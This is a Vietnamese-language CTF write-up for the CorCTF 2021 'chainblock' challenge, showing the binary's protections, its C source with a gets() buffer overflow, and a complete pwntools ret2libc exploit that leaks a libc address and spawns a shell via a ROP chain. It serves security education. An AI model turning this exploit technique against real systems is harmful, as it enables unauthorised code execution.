# CorCTF 2021 


## BlockChain

```
 Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'

```
Đề bài cung cấp cho chúng ta 1 file binary ELF và libc version của chương trình.
Sau khi kiểm tra các thuộc tính của file ELF chúng ta có thể đọc source code được kèm theo để xác định flow của chương trình.
```
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}

```

Sau khi đọc xong source code thì chúng ta xác định được rằng không có flag cũng như hàm gọi flag trong chương trình, điều đó có nghĩa là chúng ta phải gọi shell bằng phương pháp ret2libc. 

Vì chúng ta được có được libc version, nên chúng ta có thể xác định được offset của hàm system,puts, cũng như chuỗi *"/bin/sh"* để viết ROP. Từ libc chúng ta cũng xác định được hàm các hàm cần thiết như *got.puts , plt.puts , main*.




```
from pwn import * 

BIN = "./chainblock"
libc = ELF("libc.so.6")
elf = ELF(BIN)
name = b"Techlead "
pop = 0x0000000000401493 #pop rdi ; ret
ret = 0x000000000040101a

def exploit():
	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(elf.symbols['got.puts'])
	payload += p64(elf.symbols['plt.puts'])
	payload += p64(elf.symbols['main'])
	io.sendline(payload)
	io.recvuntil('KYC failed, wrong identity!\n')
	puts = u64((io.recv(6)+b'\x00'*2))

	libc_base = puts - libc.symbols['puts']
	print("Libc base:", hex(libc_base))
	sys_offset = libc.symbols['system']
	bin_offset = next(libc.search(b"/bin/sh"))
	sys_call = libc_base + sys_offset
	bin_call = libc_base + bin_offset

	payload = name + b"a"*(256-len(name)) + b"b"*8
	payload += p64(pop)
	payload += p64(bin_call)
	payload += p64(ret)
	payload += p64(sys_call)
	io.sendline(payload)
	io.interactive()
	

io = process(BIN)
#io = remote('pwn.be.ax',5000)
exploit()
```


